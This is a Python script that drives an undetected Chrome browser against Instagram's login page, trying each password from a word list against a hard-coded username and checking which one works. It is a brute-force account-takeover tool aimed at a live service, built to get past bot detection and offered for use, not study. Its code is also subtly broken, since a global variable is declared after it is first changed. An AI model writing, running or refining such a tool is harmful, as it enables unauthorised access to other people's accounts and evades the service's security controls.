import os
import time
from datetime import datetime

import pytest
import undetected_chromedriver as uc

from pages.login_page import LoginPage
from Resources.pass_to_temp import split_words
from Resources.pass_to_temp import password_list

# Config var
url = 'https://www.instagram.com/accounts/login/'
proc = 0
input_file = "test.txt"
num_temp = 1
# groups = split_words(password_list(input_file), num_temp)
username = 'Tim0ut_13'

#

options = uc.ChromeOptions()

options.add_argument("--disable-dev-shm-usage")
options.add_argument("--no-sandbox")
options.add_argument("--blink-settings=imagesEnabled=false")
prefs = {}
prefs["profile.managed_default_content_settings.images"] = 2
# options.add_argument("--headless")
options.add_experimental_option("prefs", prefs)



def login():
    driver = uc.Chrome(version_main=116, options=options)
    proc += 1
    login_page = LoginPage(driver, proc)
    cpu = f'Process n°{login_page.proc}'
    print(f'\n{cpu} - Starting')

    driver.implicitly_wait(3)

    t1 = datetime.now()
    global proc

    ct = 0

    # Todo:
    #   1. password_list() method who return a list of strings
    #   form a temp file. Charge the list from file HERE

    print(f'{cpu} - Connecting to {url}')
    login_page.open_page(url)
    login_page.is_cookies_here()

    # temp = password_list(f'temp{proc}.txt')
    temp = password_list(input_file)

    # t = (datetime.now() - t1).seconds
    # print(f'Config Exec Time : {t}')

    for password in temp:
        # t1 = datetime.now()
        ct += 1
        login_page.login_action(username, password)
        login_page.is_password_works(password, ct)
        # t = (datetime.now() - t1).seconds
        # print(f'Trying Password Exec Time : {t}')

login()
